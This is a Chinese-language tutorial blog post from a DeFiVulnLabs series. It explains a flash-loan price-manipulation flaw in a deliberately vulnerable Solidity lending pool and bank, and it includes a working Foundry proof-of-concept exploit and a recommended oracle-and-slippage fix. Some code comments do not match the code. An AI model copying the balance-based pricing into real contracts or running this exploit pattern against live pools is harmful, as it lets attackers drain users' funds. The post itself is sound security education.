#  DeFiVulnLabs靶场全系列详解（三十二）基于闪电贷的价格操纵漏洞   
原创 kkecho  Ice ThirdSpace   2025-04-30 01:30  
  
01  
  
—  
  
**前言**  
  
  
此内容仅作为展示Solidity常见错误的概念证明。它严格用于教育目的，不应被解释为鼓励或认可任何形式的非法活动或实际的黑客攻击企图。所提供的信息仅供参考和学习，基于此内容采取的任何行动均由个人全权负责。使用这些信息应遵守适用的法律、法规和道德标准。  
  
DeFiVulnLabs一共有47个漏洞实验，包括各种经典的合约漏洞和一些少见的可能造成安全问题的不安全代码，本系列将逐一解析每个漏洞，包括官方的解释和自己的理解。  
  
  
02  
  
—  
  
**价格操纵漏洞**  
  
  
漏洞解析：  
  
这段代码展示了一个简单的 DeFi 场景，其中涉及价格操纵攻击。通过闪电贷借入大量代币，攻击者可以操纵池中的代币余额，从而影响价格计算。这种攻击利用了 SimplePool  
 合约中不安全的 getPrice  
 函数，该函数直接基于代币余额计算价格，容易受到操纵。  
  
  
代码地址：  
  
ht  
tps://github.com  
/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Price_manipulation.sol  
  
  
代码解析：  
  
首先代码一上来就来了两个稳定币合约，usda和usdb，这两个合约只有一个方法就是Mint，直接在创建该合约的时候构造方法会直接铸造对应的代币  
```
contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

```  
  
第二段代码是一个借贷池合约，有两个方法getPrice——获取价格和flashLoan——闪电贷，而getPrice这段代码就是漏洞问题所在，它的不严格计算会影响后续SimpleBank里的exchange操作。  
```
contract SimplePool {
    IERC20 public USDaToken;
    IERC20 public USDbToken;

    constructor(address _USDa, address _USDb) {
        USDaToken = IERC20(_USDa);
        USDbToken = IERC20(_USDb);
    }

    function getPrice() public view returns (uint256) {
        // Incorrect price calculation over balanceOf
        // 错误的价格计算来自于balanceof
        uint256 USDaAmount = USDaToken.balanceOf(address(this));
        uint256 USDbAmount = USDbToken.balanceOf(address(this));

        // Ensure USDbAmount is not zero to prevent division by zero
        if (USDaAmount == 0) {
            return 0;
        }

        // Calculate the price as the ratio of USDa to USDb
        //usda的价格来源usdb的数量除以usda的数量
        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }

    function flashLoan(
        uint256 amount,
        address borrower,
        bytes calldata data
    ) public {
        uint256 balanceBefore = USDaToken.balanceOf(address(this));
        require(balanceBefore >= amount, "Not enough liquidity");
        require(
            USDaToken.transfer(borrower, amount),
            "Flashloan transfer failed"
        );
        (bool success, ) = borrower.call(data);
        require(success, "Flashloan callback failed");
        uint256 balanceAfter = USDaToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flashloan not repaid");
    }
}
```  
  
usda的价格来源usdb的数量除以usda的数量，由于本来它们一开始mint的个数是一样的，所以他们的价格比例自然是1:1，但是简单的借贷池能够快速给账户提供流动性，然后借钱给了用户之后，该合约里的余额balances自然会减少了。  
  
  
而pool.getPrice()里依赖代币池的实时余额来计算价格，  
  
uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;  
  
因此攻击者可以通过闪电贷临时改变余额然后操纵价格  
  
  
第三段代码是一个简单的银行合约，这段代码很简单主要是提供了一个exchange方法用于转换币，在开头里就设定了token和payoutToken，主要是为了将USDa换乘USDb。  
  
从SimplePool合约里获取USDa对USDb的价格，来进行兑换。  
```
contract SimpleBank {
    IERC20 public token; //USDA
    SimplePool public pool;
    IERC20 public payoutToken; //USDb

    constructor(address _token, address _pool, address _payoutToken) {
        token = IERC20(_token);
        pool = SimplePool(_pool);
        payoutToken = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public {
        require(
            token.transferFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = pool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutToken.transfer(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
}
```  
  
因此攻击者可以开展一个攻击流程：  
  
    1、攻击者借入大量USDA，使池中USDA数量骤减。  
  
    2、此时getPrice()返回虚高的价格（如1 USDA = 2 USDB）。  
  
    3、攻击者以高价兑换USDB，获利后归还贷款，价格恢复。  
  
  
03  
  
—  
  
**攻击测试**  
  
****  
  
这个是  
foundry的测试代码主要的流程  
```
function testPrice_Manipulation() public {
        USDbContract.transfer(address(SimpleBankContract), 9000 ether);
        USDaContract.transfer(address(SimplePoolContract), 1000 ether);
        USDbContract.transfer(address(SimplePoolContract), 1000 ether);
        // Get the current price of USDa in terms of USDb (initially 1 USDa : 1 USDb)
        SimplePoolContract.getPrice(); // 1 USDa : 1 USDb
        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimplePoolContract.getPrice(),
            18
        );
        console.log("Start price manipulation");
        console.log("Borrow 500 USBa over floashloan");
        // Let's manipulate the price since the getPrice is over the balanceOf.
        // Use flashloan to borrow 500 USDa
        SimplePoolContract.flashLoan(500 ether, address(this), "0x0");
    }
    fallback() external {
        //flashlon callback
        emit log_named_decimal_uint(
            "Price manupulated, USDa convert rate",
            SimplePoolContract.getPrice(),
            18
        ); // 1 USDa : 2 USDb
        USDaContract.approve(address(SimpleBankContract), 100 ether);
        SimpleBankContract.exchange(100 ether);
        // Repay the flashloan by transferring 500 USDb to SimplePoolContract
        USDaContract.transfer(address(SimplePoolContract), 500 ether);
        // Get the balance of USDb owned by us.
        emit log_named_decimal_uint(
            "Use 100 USDa to convert, My USDb balance",
            USDbContract.balanceOf(address(this)),
            18
        );
    }
    receive() external payable {}
}
```  
  
  
原本价格是1：1  
```
SimplePoolContract.getPrice(); // 1 USDa : 1 USDb
```  
  
然后使用闪电贷借款后  
```
 SimplePoolContract.flashLoan(500 ether, address(this), "0x0");
```  
  
价格就变成了1:2了  
```
fallback() external {
//flashlon callback
emit log_named_decimal_uint(
"Price manupulated, USDa convert rate",
            SimplePoolContract.getPrice(),
18
        ); // 1 USDa : 2 USDb
```  
  
  
  
C:\Users\xxx\Desktop\web3-function\web3safe\foundry_nightly_win32_amd64\forge.exe  test --contracts ./src\test\Price_manipulation.sol -vvvv  
  
  
价格被恶意抬高  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZmiaibBst1BVSEzm8viaDDXZFmGibWYOYYfwsoE9HZ2CFFA7aN4Gpvt1gf1qTiaSRFBLkwISBeRGdxjx6mZiaZ9GgZNw/640?wx_fmt=png&from=appmsg "")  
  
  
  
04  
  
—  
  
**如何修复该问题**  
  
  
    这个价格的计算太草率了，单纯的以该合约里的balance来进行汇率计算是不科学的。因为可能会有超大户来操作这个合约的汇率，当然你可以说是这是市场正常的行为交易，但是还是不大严谨，尤其是部分流动性较差的合约借贷池和bank。  
  
    正确的应该是引入外部的oracle预言机来作为价格源，并增加例如滑点校验等等。  
  
  
    例如比如usda和usdb本来是价值锚定的商品，那么就可以设置滑点为1%，就可以避免这种极端套利行为。  
  
  
  
05  
  
—  
  
**感谢关注**  
  
  
个人语雀账号：https://www.yuque.com/iceqaq  
  
